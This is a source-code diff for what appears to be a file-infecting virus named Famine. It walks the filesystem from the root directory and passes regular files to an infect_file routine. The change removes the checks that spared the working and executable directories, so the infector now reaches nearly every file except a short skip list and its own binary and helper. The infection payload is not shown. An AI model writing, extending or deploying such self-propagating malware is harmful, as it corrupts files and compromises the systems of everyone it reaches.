@@ -5,6 +5,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <sys/stat.h>
+#include <unistd.h>
 
 #ifndef PATH_MAX
 # define PATH_MAX 4096
@@ -16,11 +17,10 @@ typedef struct s_scan_stats
 	uint64_t	infected_files;
 	uint64_t	skipped_files;
 	uint64_t	skipped_dirs;
-}				t_scan_stats;
+}               	t_scan_stats;
 
 static t_scan_stats	g_scan_stats;
-static char			g_work_root[PATH_MAX];
-static char			g_exec_root[PATH_MAX];
+static char		g_self_path[PATH_MAX];
 
 static int	is_dot_entry(const char *name)
 {
@@ -72,7 +72,7 @@ static int	is_skipped_dir(const char *path)
 		"/media",
 		NULL
 	};
-	int	i;
+	int		i;
 
 	for (i = 0; skip[i] != NULL; ++i)
 	{
@@ -85,16 +85,31 @@ static int	is_skipped_dir(const char *path)
 	return (0);
 }
 
-static int	is_under_root(const char *path, const char *root)
+static int	is_same_path(const char *a, const char *b)
 {
-	size_t	len;
+	size_t	la;
+	size_t	lb;
 
-	if (root[0] == '\0' || (root[0] == '/' && root[1] == '\0'))
+	if (a == NULL || b == NULL)
 		return (0);
-	len = strlen(root);
-	if (strncmp(path, root, len) != 0)
+	la = strlen(a);
+	lb = strlen(b);
+	while (la > 1 && a[la - 1] == '/')
+		la--;
+	while (lb > 1 && b[lb - 1] == '/')
+		lb--;
+	if (la != lb)
 		return (0);
-	return (path[len] == '/' || path[len] == '\0');
+	return (strncmp(a, b, la) == 0);
+}
+
+static int	is_forbidden_file(const char *path)
+{
+	if (is_same_path(path, FAMINE_HELPER_PATH))
+		return (1);
+	if (g_self_path[0] != '\0' && is_same_path(path, g_self_path))
+		return (1);
+	return (0);
 }
 
 static int	build_path(char *path, size_t size, const char *dirname, const char *name)
@@ -110,22 +125,15 @@ static int	build_path(char *path, size_t size, const char *dirname, const char *
 	return (0);
 }
 
-static void	set_exec_root(void)
+static void	set_self_path(void)
 {
 	ssize_t	len;
-	char	*slash;
 
-	len = readlink("/proc/self/exe", g_exec_root, sizeof(g_exec_root) - 1);
+	len = readlink("/proc/self/exe", g_self_path, sizeof(g_self_path) - 1);
 	if (len < 0)
-		return;
-	g_exec_root[len] = '\0';
-	slash = strrchr(g_exec_root, '/');
-	if (slash == NULL)
-		g_exec_root[0] = '\0';
-	else if (slash == g_exec_root)
-		g_exec_root[1] = '\0';
+		g_self_path[0] = '\0';
 	else
-		*slash = '\0';
+		g_self_path[len] = '\0';
 }
 
 static int	process_regular_file(const char *path, struct stat *st)
@@ -183,6 +191,8 @@ static void	infect_file(const char *path)
 {
 	struct stat	st;
 
+	if (is_forbidden_file(path))
+		return;
 	if (lstat(path, &st) < 0)
 		return;
 	if (!S_ISREG(st.st_mode))
@@ -197,8 +207,7 @@ static void	scan_directory(const char *dirname)
 	char			path[PATH_MAX];
 	struct stat		st;
 
-	if (is_skipped_dir(dirname) || is_under_root(dirname, g_work_root)
-		|| is_under_root(dirname, g_exec_root))
+	if (is_skipped_dir(dirname))
 	{
 		g_scan_stats.skipped_dirs++;
 		return;
@@ -227,9 +236,7 @@ static void	scan_directory(const char *dirname)
 void	scan_targets(void)
 {
 	memset(&g_scan_stats, 0, sizeof(g_scan_stats));
-	memset(g_work_root, 0, sizeof(g_work_root));
-	memset(g_exec_root, 0, sizeof(g_exec_root));
-	getcwd(g_work_root, sizeof(g_work_root));
-	set_exec_root();
+	memset(g_self_path, 0, sizeof(g_self_path));
+	set_self_path();
 	scan_directory("/");
 }
